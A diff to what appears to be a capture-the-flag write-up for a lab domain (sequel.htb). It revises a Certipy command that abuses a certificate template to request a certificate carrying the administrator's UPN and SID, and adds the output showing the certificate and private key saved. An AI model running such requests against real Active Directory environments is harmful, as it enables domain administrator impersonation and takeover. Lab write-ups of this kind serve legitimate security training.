@@ -613,6 +613,19 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 First i need the administrator SID
 
 ```python
-certipy-ad req -u 'ca_svc' -p 'Password123!' -dc-ip '10.129.232.128' -ca 'sequel-DC01-CA' -template 'DunderMifflinAuthentication' -upn 'administrator@sequel.htb' -sid 'S-1-5-21-548670397-972687484-3496335370-500' -dns 'dc01.sequel.htb' -debug
+certipy-ad req -u 'ca_svc@sequel.htb' -p 'Password123!' -dc-ip '10.129.232.128' -ca 'sequel-DC01-CA' -template 'DunderMifflinAuthentication' -upn 'administrator@sequel.htb' -sid 'S-1-5-21-548670397-972687484-3496335370-500' -dns 'dc01.sequel.htb' -key-size 4096
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 19
+[*] Successfully requested certificate
+[*] Got certificate with multiple identities
+    UPN: 'administrator@sequel.htb'
+    DNS Host Name: 'dc01.sequel.htb'
+[*] Certificate object SID is 'S-1-5-21-548670397-972687484-3496335370-500'
+[*] Saving certificate and private key to 'administrator_dc01.pfx'
+[*] Wrote certificate and private key to 'administrator_dc01.pfx'
 ```
+
+
 
